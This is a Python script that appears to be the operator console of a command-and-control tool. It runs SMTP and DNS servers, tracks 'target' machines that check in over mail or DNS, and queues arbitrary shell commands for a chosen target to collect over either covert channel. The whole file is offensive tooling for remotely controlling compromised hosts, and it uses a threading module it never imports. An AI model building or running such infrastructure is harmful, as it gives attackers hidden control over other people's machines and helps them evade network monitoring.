'''
    Spins up servers for both and allows running commands on either from one shell
'''
import smtp.server
from dns.server import MemeResolver
from dnslib.server import *
import asyncore

def machineList(machines):
    if len(machines) == 0:
        print("No known machines.")
        return
    for i in range(len(machines)):
        print(i, ":  ",machines[i])

def main():
    mail = smtp.server.MailmanServer(("0.0.0.0", 25), None)
    resolver = MemeResolver()
    dns = DNSServer(resolver, port=53, address="0.0.0.0", tcp=False)

    dns.start_thread()
    print("DNS server on UDP 53 started")
    thread = threading.Thread(target=asyncore.loop, kwargs={'timeout': 1})
    thread.start()
    print("SMTP server on TCP 25 started")
    print("Commands:")
    print("         l - List all known machines")
    print("         dl - List known machines from DNS")
    print("         dc # - Set command for machine # over DNS")
    print("         ml - List known machines from mail")
    print("         mc # - Set command for machine # over mail")
    try:
        while 1:
            cmd = input("mailman# ")
            if cmd == "" or cmd == None:
                continue
            if cmd == "l":
                print("DNS Targets:")
                machineList(resolver.knownHosts)
                print("Mail Targets:")
                machineList(mail.knownHosts)
            elif cmd[0] == "d":
                if cmd[1] == "l":
                    machineList(resolver.knownHosts)
                elif cmd[1] == "c":
                    target = int(cmd.split(" ")[1])
                    targetCmd = input("Target$ ")
                    resolver.waitingCommands[resolver.knownHosts[target]] = targetCmd
                else:
                    print("Unknown command.")
            elif cmd[0] == "m" or cmd[0] == "s":
                if cmd[1] == "l":
                    machineList(mail.knownHosts)
                elif cmd[1] == "c":
                    target = int(cmd.split(" ")[1])
                    targetCmd = input("Target$ ")
                    mail.waitingCommands[mail.knownHosts[target]] = targetCmd
                else:
                    print("Unknown command.")
            else:
                print("Unknown command.")
    except KeyboardInterrupt:
        pass

main()